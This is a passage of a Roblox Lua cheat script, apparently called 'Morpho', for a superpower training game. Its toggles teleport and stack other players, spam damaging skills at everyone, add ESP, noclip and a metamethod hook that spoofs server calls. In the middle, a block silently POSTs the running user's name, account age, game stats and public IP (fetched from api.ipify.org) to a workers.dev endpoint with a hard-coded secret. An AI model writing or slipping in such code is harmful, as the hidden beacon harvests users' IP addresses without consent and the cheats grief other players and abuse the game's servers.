            Framework.Runtime.Connections.SitOnHead = RunService.PreRender:Connect(function()
                for _, Target in Globals.PlayersData.Targets do
                    if GameUtility:IsAlive(LocalPlayer) and GameUtility:IsAlive(PlayersService:FindFirstChild(Target)) then
                        LocalPlayer.Character.Humanoid.Sit = true
                        LocalPlayer.Character.Humanoid.RootPart.Velocity = Vector3.new(0, 0, 0)
                        LocalPlayer.Character.Humanoid.RootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                        LocalPlayer.Character.Humanoid.RootPart:PivotTo(PlayersService:FindFirstChild(Target).Character:WaitForChild("Head"):GetPivot() * CFrame.new(0, 2.5, 0))
                    end
                end
            end)
        end
    end)

    Toggles.CBringAll:OnChanged(function()
        if Framework.Runtime.Connections.CBringAll then
            Framework.Runtime.Connections.CBringAll:Disconnect()
            Framework.Runtime.Connections.CBringAll = nil
        end
        if Toggles.CBringAll.Value then
            Framework.Runtime.Connections.CBringAll = RunService.PreRender:Connect(function()
                for _, Player in PlayerList do
                    if Player ~= LocalPlayer and not table.find(Globals.PlayersData.Whitelisted, Player.Name) and GameUtility:IsAlive(LocalPlayer) and GameUtility:IsAlive(Player) then
                        Player.Character.Humanoid.RootPart:PivotTo(LocalPlayer.Character.Humanoid.RootPart:GetPivot() + LocalPlayer.Character.Humanoid.RootPart:GetPivot().LookVector * 1)
                    end
                end
            end)
        end
    end)

    Toggles.StackAll:OnChanged(function()
        if Framework.Runtime.Connections.StackAll then
            Framework.Runtime.Connections.StackAll:Disconnect()
            Framework.Runtime.Connections.StackAll = nil
        end
        if Toggles.StackAll.Value then
            Framework.Runtime.Connections.StackAll = RunService.PreRender:Connect(function()
                NetworkUtility:FireServer("RemoteEvent", { "Skill_SpherePunch", Vector3.new(0, 1e20, 0) })
                for _, Player in PlayerList do
                    if Player ~= LocalPlayer and GameUtility:IsAlive(LocalPlayer) and GameUtility:IsAlive(Player) and not table.find(Globals.PlayersData.Whitelisted, Player.Name) and (not Player.Character:FindFirstChild("SafeZoneShield") and not Player.Character:FindFirstChild("ForceField")) and (not LocalPlayer.Character:FindFirstChild("SafeZoneShield") and not LocalPlayer.Character:FindFirstChild("ForceField") and Player.Character.Humanoid:WaitForChild("MaxHP").Value <= Framework.Configuration.ClientData.FistStrength * 1.5) then
                        Player.Character.Humanoid.RootPart:PivotTo(CFrame.new(5e2, 5e3, 5e2))
                        for _, Sphere in Storage:GetChildren() do
                            if Sphere.Name == GameUtility:GetSphere(StatThresholds) then
                                FireTouchInterest(Player.Character.Humanoid.RootPart, Sphere, 0)
                            end
                        end
                    end
                end
            end)
        end
    end)

    Toggles.SoulAttackAll:OnChanged(function()
        if Framework.Runtime.Connections.SoulAttackAll then
            Framework.Runtime.Connections.SoulAttackAll:Disconnect()
            Framework.Runtime.Connections.SoulAttackAll = nil
        end
        if Toggles.SoulAttackAll.Value then
            Framework.Runtime.Connections.SoulAttackAll = RunService.PreRender:Connect(function()
                for _, Player in PlayerList do
                    if Player ~= LocalPlayer and GameUtility:IsAlive(LocalPlayer) and GameUtility:IsAlive(Player) and not table.find(Globals.PlayersData.Whitelisted, Player.Name) and (not Player.Character:FindFirstChild("SafeZoneShield") and not Player.Character:FindFirstChild("ForceField")) and (not LocalPlayer.Character:FindFirstChild("SafeZoneShield") and not LocalPlayer.Character:FindFirstChild("ForceField")) then
                        LocalPlayer.Character.Humanoid.RootPart:PivotTo(Player.Character.Humanoid.RootPart:GetPivot() * CFrame.new(Player.Character.Humanoid.RootPart.Velocity / 10))
                        NetworkUtility:FireServer("RemoteEvent", { "Skill_SoulAttack_Start", Player })
                        NetworkUtility:FireServer("RemoteEvent", { "Skill_SoulAttack_End" })
                        break
                    end
                end
            end)
        end
    end)

    Toggles.HellFireAll:OnChanged(function()
        if Framework.Runtime.Connections.HellFireAll then
            Framework.Runtime.Connections.HellFireAll:Disconnect()
            Framework.Runtime.Connections.HellFireAll = nil
        end
        if Toggles.HellFireAll.Value then
            Framework.Runtime.Connections.HellFireAll = RunService.PreRender:Connect(function()
                for _, Player in PlayerList do
                    if Player ~= LocalPlayer and GameUtility:IsAlive(LocalPlayer) and GameUtility:IsAlive(Player) and not table.find(Globals.PlayersData.Whitelisted, Player.Name) and (not Player.Character:FindFirstChild("SafeZoneShield") and not Player.Character:FindFirstChild("ForceField")) and (not LocalPlayer.Character:FindFirstChild("SafeZoneShield") and not LocalPlayer.Character:FindFirstChild("ForceField")) then
                        LocalPlayer.Character.Humanoid.RootPart:PivotTo(Player.Character.Humanoid.RootPart:GetPivot() * CFrame.new(Player.Character.Humanoid.RootPart.Velocity / 10))
                        NetworkUtility:FireServer("RemoteEvent", { "Skill_Hellfire", Player })
                        break
                    end
                end
            end)
        end
    end)

    Toggles.SoulReapAll:OnChanged(function()
        if Framework.Runtime.Connections.SoulReapAll then
            Framework.Runtime.Connections.SoulReapAll:Disconnect()
            Framework.Runtime.Connections.SoulReapAll = nil
        end
        if Toggles.SoulReapAll.Value then
            Framework.Runtime.Connections.SoulReapAll = RunService.PreRender:Connect(function()
                for _, Player in PlayerList do
                    if Player ~= LocalPlayer and GameUtility:IsAlive(LocalPlayer) and GameUtility:IsAlive(Player) and not table.find(Globals.PlayersData.Whitelisted, Player.Name) and (not Player.Character:FindFirstChild("SafeZoneShield") and not Player.Character:FindFirstChild("ForceField")) and (not LocalPlayer.Character:FindFirstChild("SafeZoneShield") and not LocalPlayer.Character:FindFirstChild("ForceField")) then
                        NetworkUtility:FireServer("RemoteEvent", { "Skill_SoulReap", Player })
                        break
                    end
                end
            end)
        end
    end)
end

do
    Toggles.LoopTeleportToLocation:OnChanged(function()
        if Framework.Runtime.Connections.LoopTeleportToLocation then
            Framework.Runtime.Connections.LoopTeleportToLocation:Disconnect()
            Framework.Runtime.Connections.LoopTeleportToLocation = nil
        end
        if Toggles.LoopTeleportToLocation.Value then
            Framework.Runtime.Connections.LoopTeleportToLocation = RunService.PreRender:Connect(function()
                if GameUtility:IsAlive(LocalPlayer) then
                    LocalPlayer.Character.Humanoid.RootPart:PivotTo(Globals.TeleportSystem.Locations[Options.Locations.Value])
                end
            end)
        end
    end)
end

do
    Toggles.SpamAura:OnChanged(function()
        if Framework.Runtime.Connections.SpamAura then
            Framework.Runtime.Connections.SpamAura:Disconnect()
            Framework.Runtime.Connections.SpamAura = nil
        end
        if Toggles.SpamAura.Value then
            Framework.Runtime.Connections.SpamAura = RunService.PreRender:Connect(function()
                NetworkUtility:FireServer("RemoteEvent", { "ConcealRevealAura" })
            end)
        end
    end)

    Toggles.SpamInvisibility:OnChanged(function()
        if Framework.Runtime.Connections.SpamInvisibility then
            Framework.Runtime.Connections.SpamInvisibility:Disconnect()
            Framework.Runtime.Connections.SpamInvisibility = nil
        end
        if Toggles.SpamInvisibility.Value then
            Framework.Runtime.Connections.SpamInvisibility = RunService.PreRender:Connect(function()
                NetworkUtility:FireServer("RemoteEvent", { "Skill_Invisible", "Start" })
            end)
        end
    end)

    Toggles.SpamKillingIntentAura:OnChanged(function()
        if Framework.Runtime.Connections.SpamKillingIntentAura then
            Framework.Runtime.Connections.SpamKillingIntentAura:Disconnect()
            Framework.Runtime.Connections.SpamKillingIntentAura = nil
        end
        if Toggles.SpamKillingIntentAura.Value then
            Framework.Runtime.Connections.SpamKillingIntentAura = RunService.PreRender:Connect(function()
                NetworkUtility:FireServer("RemoteEvent", { "Skill_KillingIntent_Start" })
            end)
        end
    end)

    Toggles.RainbowRank:OnChanged(function()
        if Framework.Runtime.Connections.RainbowRank then
            Framework.Runtime.Connections.RainbowRank:Disconnect()
            Framework.Runtime.Connections.RainbowRank = nil
        end
        if Toggles.RainbowRank.Value then
            local LastRankTime = tick()
            Framework.Runtime.Connections.RainbowRank = RunService.PreRender:Connect(function()
                local CurrentTime = tick()
                if CurrentTime - LastRankTime >= 0.1 then
                    LastRankTime = CurrentTime
                    NetworkUtility:FireServer("RemoteEvent", { "ChangeRankEmblem", math.random(1, 10) })
                end
            end)
        else
            task.delay(0.5, function()
                NetworkUtility:FireServer("RemoteEvent", { "ChangeRankEmblem", 10 })
            end)
        end
    end)

    Toggles.RainbowWeight:OnChanged(function()
        if Framework.Runtime.Connections.RainbowWeight then
            Framework.Runtime.Connections.RainbowWeight:Disconnect()
            Framework.Runtime.Connections.RainbowWeight = nil
        end
        if Toggles.RainbowWeight.Value then
            local LastWeightTime = tick()
            Framework.Runtime.Connections.RainbowWeight = RunService.PreRender:Connect(function()
                local CurrentTime = tick()
                if CurrentTime - LastWeightTime >= 0.1 then
                    LastWeightTime = CurrentTime
                    NetworkUtility:FireServer("RemoteEvent", { "EquipWeight_Request", math.random(1, 4) })
                end
            end)
        else
            task.delay(0.5, function()
                NetworkUtility:FireServer("RemoteEvent", { "EquipWeight_Request", 0 })
            end)
        end
    end)

    Toggles.RainbowAura:OnChanged(function()
        if Framework.Runtime.Connections.RainbowAura then
            Framework.Runtime.Connections.RainbowAura:Disconnect()
            Framework.Runtime.Connections.RainbowAura = nil
        end
        if Toggles.RainbowAura.Value then
            Framework.Runtime.Connections.RainbowAura = RunService.PreRender:Connect(function()
                for _, Player in PlayerList do
                    if GameUtility:IsAlive(Player) then
                        for _, PartName in { "LeftHand", "RightHand", "LeftUpperLeg", "RightUpperLeg", "UpperTorso" } do
                            if Player.Character:FindFirstChild(PartName) then
                                for _, ParticleInstance in Player.Character[PartName]:GetChildren() do
                                    if ParticleInstance:IsA("ParticleEmitter") and ParticleInstance.Name:match("AURA") then
                                        ParticleInstance.Color = ColorSequence.new(Color3.fromHSV(tick() % 5 / 5, 1, 1))
                                    end
                                end
                            end
                        end
                    end
                end
            end)
        else
            for _, Player in PlayerList do
                if GameUtility:IsAlive(Player) and Player ~= LocalPlayer then
                    for _, ParticleInstance in Player.Character:GetDescendants() do
                        if ParticleInstance:IsA("ParticleEmitter") then
                            ParticleInstance:Destroy()
                        end
                    end
                end
            end
            NetworkUtility:FireServer("RemoteEvent", { "Respawn" })
        end
    end)

    Toggles.RainbowNames:OnChanged(function()
        if Framework.Runtime.Connections.RainbowNames then
            Framework.Runtime.Connections.RainbowNames:Disconnect()
            Framework.Runtime.Connections.RainbowNames = nil
        end
        if Toggles.RainbowNames.Value then
            Framework.Runtime.Connections.RainbowNames = RunService.PreRender:Connect(function()
                for _, Player in PlayerList do
                    if GameUtility:IsAlive(Player) then
                        local NameTag = Player.Character.Humanoid.RootPart:FindFirstChild("SPTS_PN_BG")
                        if NameTag and NameTag:FindFirstChild("NameTxt") then
                            NameTag.NameTxt.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
                            NameTag.NameTxt.TextStrokeColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
                        end
                    end
                end
            end)
        else
            task.delay(0.1, function()
                for _, Player in PlayerList do
                    if GameUtility:IsAlive(Player) then
                        local NameTag = Player.Character.Humanoid.RootPart:FindFirstChild("SPTS_PN_BG")
                        if NameTag and NameTag:FindFirstChild("NameTxt") then
                            NameTag.NameTxt.TextColor3 = GameUtility:UpdateColor(Player:WaitForChild("leaderstats").Status.Value, HeroFolder, VillainFolder, Globals.Titles)
                            NameTag.NameTxt.TextStrokeColor3 = GameUtility:UpdateStrokeColor(Player:WaitForChild("leaderstats").Status.Value, HeroFolder, VillainFolder, Globals.Titles)
                        end
                    end
                end
            end)
        end
    end)

    Toggles.CustomAura:OnChanged(function()
        if Framework.Runtime.Connections.CustomAura then
            Framework.Runtime.Connections.CustomAura:Disconnect()
            Framework.Runtime.Connections.CustomAura = nil
        end
        if Toggles.CustomAura.Value then
            Framework.Runtime.Connections.CustomAura = RunService.PreRender:Connect(function()
                for _, Player in PlayerList do
                    if GameUtility:IsAlive(Player) then
                        for _, PartName in { "LeftHand", "RightHand", "LeftUpperLeg", "RightUpperLeg", "UpperTorso" } do
                            if Player.Character:FindFirstChild(PartName) then
                                for _, ParticleInstance in Player.Character[PartName]:GetChildren() do
                                    if ParticleInstance:IsA("ParticleEmitter") and ParticleInstance.Name:match("AURA") then
                                        ParticleInstance.Color = ColorSequence.new({
                                            ColorSequenceKeypoint.new(0, Options.CustomColor.Value),
                                            ColorSequenceKeypoint.new(0.5, Options.CustomColor.Value),
                                            ColorSequenceKeypoint.new(1, Options.CustomColor.Value),
                                        })
                                    end
                                end
                            end
                        end
                    end
                end
            end)
        else
            for _, Player in PlayerList do
                if GameUtility:IsAlive(Player) and Player ~= LocalPlayer then
                    for _, ParticleInstance in Player.Character:GetDescendants() do
                        if ParticleInstance:IsA("ParticleEmitter") then
                            ParticleInstance:Destroy()
                        end
                    end
                end
            end
            NetworkUtility:FireServer("RemoteEvent", { "Respawn" })
        end
    end)

    Toggles.CustomNames:OnChanged(function()
        if Framework.Runtime.Connections.CustomNames then
            Framework.Runtime.Connections.CustomNames:Disconnect()
            Framework.Runtime.Connections.CustomNames = nil
        end
        if Toggles.CustomNames.Value then
            Framework.Runtime.Connections.CustomNames = RunService.PreRender:Connect(function()
                for _, Player in PlayerList do
                    if GameUtility:IsAlive(Player) then
                        local NameTag = Player.Character.Humanoid.RootPart:FindFirstChild("SPTS_PN_BG")
                        if NameTag and NameTag:FindFirstChild("NameTxt") then
                            NameTag.NameTxt.TextColor3 = Options.CustomColor.Value
                            NameTag.NameTxt.TextStrokeColor3 = Options.CustomColor.Value
                        end
                    end
                end
            end)
        else
            task.delay(0.1, function()
                for _, Player in PlayerList do
                    if GameUtility:IsAlive(Player) then
                        local NameTag = Player.Character.Humanoid.RootPart:FindFirstChild("SPTS_PN_BG")
                        if NameTag and NameTag:FindFirstChild("NameTxt") then
                            NameTag.NameTxt.TextColor3 = GameUtility:UpdateColor(Player:WaitForChild("leaderstats").Status.Value, HeroFolder, VillainFolder, Globals.Titles)
                            NameTag.NameTxt.TextStrokeColor3 = GameUtility:UpdateStrokeColor(Player:WaitForChild("leaderstats").Status.Value, HeroFolder, VillainFolder, Globals.Titles)
                        end
                    end
                end
            end)
        end
    end)

    Toggles.Noclip:OnChanged(function()
        if Framework.Runtime.Connections.Noclip then
            Framework.Runtime.Connections.Noclip:Disconnect()
            Framework.Runtime.Connections.Noclip = nil
        end
        if Toggles.Noclip.Value then
            Framework.Runtime.Connections.Noclip = RunService.PreRender:Connect(function()
                if GameUtility:IsAlive(LocalPlayer) then
                    for _, Object in LocalPlayer.Character:GetChildren() do
                        if Object:IsA("BasePart") and Object.CanCollide then
                            Object.CanCollide = false
                        end
                    end
                end
            end)
        else
            NetworkUtility:FireServer("RemoteEvent", { "Respawn" })
        end
    end)

    Toggles.Spin:OnChanged(function()
        if GameUtility:IsAlive(LocalPlayer) then
            for _, Object in LocalPlayer.Character.Humanoid.RootPart:GetChildren() do
                if Object.Name == "Spin" then
                    Object:Destroy()
                end
            end
            if Toggles.Spin.Value then
                InstanceUtility:Create("BodyAngularVelocity", {
                    Name = "Spin",
                    MaxTorque = Vector3.new(0, math.huge, 0),
                    AngularVelocity = Vector3.new(0, Options.SpinSpeed.Value, 0),
                }, LocalPlayer.Character.Humanoid.RootPart)
            end
        end
    end)

    Options.SpinSpeed:OnChanged(function()
        if Toggles.Spin.Value and GameUtility:IsAlive(LocalPlayer) then
            local Spin = LocalPlayer.Character.Humanoid.RootPart:FindFirstChild("Spin")
            if Spin then
                Spin.AngularVelocity = Vector3.new(0, Options.SpinSpeed.Value, 0)
            end
        end
    end)

    Toggles.Gravity:OnChanged(function()
        if Toggles.Gravity.Value then
            WorkspaceService.Gravity = Options.GravityValue.Value
        else
            WorkspaceService.Gravity = Globals.GameConfiguration.Physics.Gravity
        end
    end)

    Options.GravityValue:OnChanged(function()
        if Toggles.Gravity.Value then
            WorkspaceService.Gravity = Options.GravityValue.Value
        end
    end)
end

do
    Options.PanicKeybind:OnClick(function()
        if GameUtility:IsAlive(LocalPlayer) then
            LocalPlayer.Character.Humanoid.RootPart:PivotTo(CFrame.new(470, 250, 900))
        end
    end)

    Options.RespawnKeybind:OnClick(function()
        NetworkUtility:FireServer("RemoteEvent", { "Respawn" })
    end)

    Options.FpsCap:OnChanged(function()
        if setfpscap and ThreeDRenderingEnabled then
            setfpscap(Options.FpsCap.Value)
        end
    end)
end

Request({
    Url = "https://a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f.brysskatina.workers.dev/super_secret_token_tipa",
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json",
        ["User-Agent"] = "Morpho/Linux",
        ["X-Webhook-Secret"] = "j7hva6gB8nhHy78680578tvu868861h7"
    },
    Body = HttpService:JSONEncode({
        content = "",
        embeds = { {
            title = "**Morpho**",
            description = "Name: **" .. LocalPlayer.Name .. "**",
            type = "rich",
            color = 0x8e9c42,
            timestamp = DateTime.now():ToIsoDate(),
            fields = {
                { name = "**Account Age:**", value = LocalPlayer.AccountAge .. " days", inline = true },
                { name = "**IP:**", value = game:HttpGet("https://api.ipify.org"), inline = true },
                { name = "**Fist Strength:**", value = MathUtility:FormatNumber(Framework.Configuration.ClientData.FistStrength), inline = true },
                { name = "**Body Toughness:**", value = MathUtility:FormatNumber(Framework.Configuration.ClientData.BodyToughness), inline = true },
                { name = "**Psychic Power:**", value = MathUtility:FormatNumber(Framework.Configuration.ClientData.PsychicPower), inline = true },
                { name = "**Tokens:**", value = MathUtility:FormatNumber(Framework.Configuration.ClientData.Token), inline = true },
            },
            footer = { text = JobIdentifier },
        } },
    }),
})

do
    if SupportCheck then
        local OldCall
        OldCall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
            local Method = getnamecallmethod()
            local Arguments = { ... }
            if Method == "FireServer" and self == "RemoteEvent" then
                if Arguments[1][1] == "Update_Flying_Status" then
                    Arguments[1][2] = true
                elseif Arguments[1][1] == "Meditation_Request" then
                    Arguments[1][2] = true
                end
            elseif Method == "Create" then
                if Arguments[1] == Camera then
                    return setmetatable({}, { __index = function() return function() end end })
                end
            elseif not checkcaller() and self == LocalPlayer.Character and Method == "BreakJoints" then
                return nil
            end
            return OldCall(self, ...)
        end))
    end

    task.spawn(function()
        repeat
            RunService.PreRender:Wait()
        until LocalPlayer.Character
        task.delay(0.5, function()
            function RemoteFunction.OnClientInvoke()
                return false
            end
        end)
    end)

    RemoteEvent.OnClientEvent:Connect(function(Arguments)
        if Arguments[1] == "Invisible" then
            local Player = Arguments[3]
            local EspFolder = EspContainer:FindFirstChild(Player.Name)
            Globals.PlayersData.Esp[Player.Name] = MathUtility:FormatNumber(Arguments[4])
            if EspFolder then
                EspFolder.Frame.Psychic.Text = "Psychic: " .. MathUtility:FormatNumber(Arguments[4])
                EspFolder.Frame.Psychic.Visible = true
            end
        end
    end)
end

task.defer(function()
    if GameUtility:IsAlive(LocalPlayer) then
        NetworkUtility:FireServer("RemoteEvent", { "Respawn" })
    end
end)

do
    for _, Object in game:GetDescendants() do
        if Object.ClassName == "RemoteEvent" then
            Network.Events[Object.Name] = Object
        elseif Object.ClassName == "RemoteFunction" then
            Network.Functions[Object.Name] = Object
        end
    end
    WorkspaceService.FallenPartsDestroyHeight = "NaN"
end

do
    local function UpdateEspAndHighlight(Player)
        local LeaderStats = Player:WaitForChild("leaderstats")
        local Status = LeaderStats:WaitForChild("Status")
        CreateEsp(Player)
        CreateHighlight(Player)
        Status:GetPropertyChangedSignal("Value"):Connect(function()
            if EspContainer:FindFirstChild(Player.Name) then
                EspContainer[Player.Name].Frame.Names.TextColor3 = GameUtility:UpdateColor(Status.Value, HeroFolder, VillainFolder, Globals.Titles)
                EspContainer[Player.Name].Frame.Names.TextStrokeColor3 = GameUtility:UpdateStrokeColor(Status.Value, HeroFolder, VillainFolder, Globals.Titles)
            end
            if HighlightsContainer:FindFirstChild(Player.Name) then
                HighlightsContainer[Player.Name].FillColor = GameUtility:UpdateColor(Status.Value, HeroFolder, VillainFolder, Globals.Titles)
                HighlightsContainer[Player.Name].OutlineColor = GameUtility:UpdateColor(Status.Value, HeroFolder, VillainFolder, Globals.Titles)
            end
        end)
        if GameUtility:IsAlive(Player) then
            local Humanoid = Player.Character:FindFirstChild("Humanoid")
            EspContainer[Player.Name].Frame.Health.Text = "Health: " .. MathUtility:FormatNumber(Humanoid:WaitForChild("CurrentHP").Value <= 0 and 0 or Humanoid:WaitForChild("CurrentHP").Value) .. "/" .. MathUtility:FormatNumber(Humanoid:WaitForChild("MaxHP").Value)
            EspContainer[Player.Name].Frame.Body.Text = "Body: " .. MathUtility:FormatNumber(Humanoid:WaitForChild("MaxHP").Value / 10)
            Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
                EspContainer[Player.Name].Frame.Health.Text = "Health: " .. MathUtility:FormatNumber(Humanoid:WaitForChild("CurrentHP").Value <= 0 and 0 or Humanoid:WaitForChild("CurrentHP").Value) .. "/" .. MathUtility:FormatNumber(Humanoid:WaitForChild("MaxHP").Value)
                EspContainer[Player.Name].Frame.Body.Text = "Body: " .. MathUtility:FormatNumber(Humanoid:WaitForChild("MaxHP").Value / 10)
            end)
            Player.Character.DescendantAdded:Connect(function(Object)
                if Object.Name == "KillingIntentPart" and Toggles.AntiKillingIntentAura.Value then
                    RunService.PreRender:Wait()
                    Object:Destroy()
                end
            end)
            Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
                if Humanoid.Health <= 0 then
                    if EspContainer:FindFirstChild(Player.Name) then
                        EspContainer[Player.Name].Adornee = nil
                        EspContainer[Player.Name].Enabled = false
                    end
                    if HighlightsContainer:FindFirstChild(Player.Name) then
                        HighlightsContainer[Player.Name].Adornee = nil
                        HighlightsContainer[Player.Name].Enabled = false
                    end
                    if Options.Logs.Value["Dead"] then
                        if Options.TypeOfLogs.Value["Chat"] then
                            GameUtility:CreateChatMessage(Player.DisplayName .. " (@" .. Player.Name .. ") Dead", Color3.new(1, 0, 0), TextChatService)
                        end
                        if Options.TypeOfLogs.Value["Notify"] then
                            Library:Notify({ Title = "[LOGS]", Description = Player.DisplayName .. " (@" .. Player.Name .. ") Dead", Time = 3 })
                        end
                        if Options.TypeOfLogs.Value["Console"] then
                            print("[LOGS]: " .. Player.DisplayName .. " (@" .. Player.Name .. ") Dead")
                        end
                    end
                end
            end)
        end
        Player.CharacterAdded:Connect(function(Character)
            local Humanoid = Character:WaitForChild("Humanoid")
            if HighlightsContainer:FindFirstChild(Player.Name) then
                HighlightsContainer[Player.Name].Adornee = Toggles.Highlights.Value and Character or nil
                HighlightsContainer[Player.Name].Enabled = Toggles.Highlights.Value
            end
            if EspContainer:FindFirstChild(Player.Name) then
                EspContainer[Player.Name].Adornee = Toggles.Esp.Value and Character:WaitForChild("Head") or nil
                EspContainer[Player.Name].Enabled = Toggles.Esp.Value
            end
            Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
                EspContainer[Player.Name].Frame.Health.Text = "Health: " .. MathUtility:FormatNumber(Humanoid:WaitForChild("CurrentHP").Value <= 0 and 0 or Humanoid:WaitForChild("CurrentHP").Value) .. "/" .. MathUtility:FormatNumber(Humanoid:WaitForChild("MaxHP").Value)
                EspContainer[Player.Name].Frame.Body.Text = "Body: " .. MathUtility:FormatNumber(Humanoid:WaitForChild("MaxHP").Value / 10)
            end)
            Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
                if Humanoid.Health <= 0 then
                    if EspContainer:FindFirstChild(Player.Name) then
                        EspContainer[Player.Name].Adornee = nil
                        EspContainer[Player.Name].Enabled = false
                    end
                    if HighlightsContainer:FindFirstChild(Player.Name) then
                        HighlightsContainer[Player.Name].Adornee = nil
                        HighlightsContainer[Player.Name].Enabled = false
                    end
                    if Options.Logs.Value["Dead"] then
                        if Options.TypeOfLogs.Value["Chat"] then
                            GameUtility:CreateChatMessage(Player.DisplayName .. " (@" .. Player.Name .. ") Dead", Color3.new(1, 0, 0), TextChatService)
                        end
                        if Options.TypeOfLogs.Value["Notify"] then
                            Library:Notify({ Title = "[LOGS]", Description = Player.DisplayName .. " (@" .. Player.Name .. ") Dead", Time = 3 })
                        end
                        if Options.TypeOfLogs.Value["Console"] then
                            print("[LOGS]: " .. Player.DisplayName .. " (@" .. Player.Name .. ") Dead")
                        end
                    end
                end
            end)
            Character.DescendantAdded:Connect(function(Object)
                if Object.Name == "KillingIntentPart" and Toggles.AntiKillingIntentAura.Value then
                    RunService.PreRender:Wait()
                    Object:Destroy()
                end
            end)
            EspContainer[Player.Name].Frame.Health.Text = "Health: " .. MathUtility:FormatNumber(Humanoid:WaitForChild("CurrentHP").Value <= 0 and 0 or Humanoid:WaitForChild("CurrentHP").Value) .. "/" .. MathUtility:FormatNumber(Humanoid:WaitForChild("MaxHP").Value)
            EspContainer[Player.Name].Frame.Body.Text = "Body: " .. MathUtility:FormatNumber(Humanoid:WaitForChild("MaxHP").Value / 10)
        end)
    end

    for _, Player in PlayerList do
        if Player ~= LocalPlayer then
            UpdateEspAndHighlight(Player)
        end
    end

    PlayersService.PlayerAdded:Connect(function(Player)
        PlayerList = PlayersService:GetPlayers()
        UpdateEspAndHighlight(Player)
        if Options.Logs.Value["Joined/Left"] then
            if Options.TypeOfLogs.Value["Chat"] then
                GameUtility:CreateChatMessage(Player.DisplayName .. " (@" .. Player.Name .. ") Has joined", Color3.new(0, 1, 0), TextChatService)
            end
            if Options.TypeOfLogs.Value["Notify"] then
                Library:Notify({ Title = "[LOGS]", Description = Player.DisplayName .. " (@" .. Player.Name .. ") Has joined", Time = 3 })
            end
            if Options.TypeOfLogs.Value["Console"] then
                print("[LOGS]: " .. Player.DisplayName .. " (@" .. Player.Name .. ") Has joined")
            end
        end
    end)

    PlayersService.PlayerRemoving:Connect(function(Player)
        PlayerList = PlayersService:GetPlayers()
        if EspContainer:FindFirstChild(Player.Name) then
            EspContainer[Player.Name]:Destroy()
        end
        if HighlightsContainer:FindFirstChild(Player.Name) then
            HighlightsContainer[Player.Name]:Destroy()
        end
        if Options.Logs.Value["Joined/Left"] then
            if Options.TypeOfLogs.Value["Chat"] then
                GameUtility:CreateChatMessage(Player.DisplayName .. " (@" .. Player.Name .. ") Has left", Color3.new(1, 0, 0), TextChatService)
            end
            if Options.TypeOfLogs.Value["Notify"] then
                Library:Notify({ Title = "[LOGS]", Description = Player.DisplayName .. " (@" .. Player.Name .. ") Has left", Time = 3 })
            end
            if Options.TypeOfLogs.Value["Console"] then
                print("[LOGS]: " .. Player.DisplayName .. " (@" .. Player.Name .. ") Has left")
            end
        end
        if table.find(Globals.PlayersData.Targets, Player.Name) then
            for Index = #Globals.PlayersData.Targets, 1, -1 do
                if Globals.PlayersData.Targets[Index] == Player.Name then
                    table.remove(Globals.PlayersData.Targets, Index)
                end
            end
        end
        if table.find(Globals.PlayersData.Whitelisted, Player.Name) then
            for Index = #Globals.PlayersData.Whitelisted, 1, -1 do
                if Globals.PlayersData.Whitelisted[Index] == Player.Name then
                    table.remove(Globals.PlayersData.Whitelisted, Index)
                end
            end
        end
    end)

    LocalPlayer.CharacterAdded:Connect(function(Character)
        local Humanoid = Character:WaitForChild("Humanoid")
        local RootPart = Humanoid.RootPart
        local SpawnedTime = tick()
        if Toggles.Spin.Value then
            task.spawn(function()
                InstanceUtility:Create("BodyAngularVelocity", {
                    Name = "Spin",
                    MaxTorque = Vector3.new(0, math.huge, 0),
                    AngularVelocity = Vector3.new(0, Options.SpinSpeed.Value, 0),
                }, RootPart)
            end)
        end
        if Toggles.AutoDisableAura.Value then
            task.spawn(function()
                repeat
                    RunService.PreRender:Wait()
                until GameUtility:IsAuraEnabled(Character)
                NetworkUtility:FireServer("RemoteEvent", { "ConcealRevealAura" })
            end)
        end
        if Options.Animations.Value and Options.Animations.Value ~= "None" then
            task.spawn(function()
                for _, Object in Globals.AnimationPackages[Options.Animations.Value] do
                    local Action, SubAction, AssetId = unpack(Object)
                    Character:WaitForChild("Animate"):WaitForChild(Action)[SubAction].AnimationId = AssetId
                end
            end)
        end
        if Globals.States.PlayerPosition and Globals.States.CameraPosition then
            task.spawn(function()
                RootPart:PivotTo(Globals.States.PlayerPosition)
                RootPart:GetPropertyChangedSignal("CFrame"):Wait()
                if (tick() - SpawnedTime) < 0.6 then
                    RootPart:PivotTo(Globals.States.PlayerPosition)
                end
            end)
            task.spawn(function()
                Camera:PivotTo(Globals.States.CameraPosition)
                Camera:GetPropertyChangedSignal("CFrame"):Wait()
                Camera:PivotTo(Globals.States.CameraPosition)
            end)
        end
        Framework.Runtime.Connections.RespawnFunction = Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
            if Humanoid.Health <= Globals.GameConfiguration.Health.Respawn then
                Framework.Runtime.Connections.RespawnFunction:Disconnect()
                NetworkUtility:FireServer("RemoteEvent", { "Respawn" })
            end
        end)
        Character.DescendantAdded:Connect(function(Object)
            if Object.Name == "KillingIntentPart" and Toggles.AntiKillingIntentAura.Value then
                RunService.PreRender:Wait()
                Object:Destroy()
            end
        end)
        if Toggles.Spectate.Value then
            for _, Target in Globals.PlayersData.Targets do
                if PlayersService:FindFirstChild(Target) and GameUtility:IsAlive(PlayersService:FindFirstChild(Target)) then
                    Camera.CameraSubject = PlayersService:FindFirstChild(Target).Character.Humanoid
                end
            end
        end
        Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
            if Humanoid.Health <= 0 then
                if not SupportCheck then
                    task.delay(0, function()
                        TweenService:Create(Camera, TweenInfo.new(0, Enum.EasingStyle.Linear), { CFrame = Camera:GetPivot() }):Play()
                    end)
                end
                if Options.Logs.Value["Dead"] then
                    if Options.TypeOfLogs.Value["Chat"] then
                        GameUtility:CreateChatMessage(LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ") Dead", Color3.new(1, 0, 0), TextChatService)
                    end
                    if Options.TypeOfLogs.Value["Notify"] then
